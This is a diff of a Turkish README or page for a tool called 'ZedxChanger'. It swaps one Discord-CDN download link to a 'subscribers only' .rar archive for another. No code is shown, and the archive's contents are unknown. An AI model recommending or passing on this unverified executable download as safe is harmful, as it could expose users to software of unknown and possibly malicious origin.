@@ -27,7 +27,7 @@
   <li>Dünyadaki tüm popüler dilleri destekler.</li>
 </ul>
 # İndirme
-  İndirdikten sonra ne yapayacağınız klasorun içindeki .txt dosyasının içinde yazmaktadır. İyi Eğlenceler <a href="https://cdn.discordapp.com/attachments/1508056044750897232/1508816161993920673/Abonelere_Ozel_ZedxChanger.rar?ex=6a16ea0d&is=6a15988d&hm=8a46458a2a8cc177726383239f718c2a200cf77cf34b850c8678ea35b6d782e5&" download>ZedxChanger</a>
+  İndirdikten sonra ne yapayacağınız klasorun içindeki .txt dosyasının içinde yazmaktadır. İyi Eğlenceler <a href="https://cdn.discordapp.com/attachments/1508056044750897232/1508819553658863687/Abonelere_Ozel_ZedxChanger.rar?ex=6a16ed36&is=6a159bb6&hm=026402c99a4b66f2dcd46be15641a6fadc9e049c38b5900a8ceade53b9883c8e&" download>ZedxChanger</a>
 
 # Kullanım
 </div>
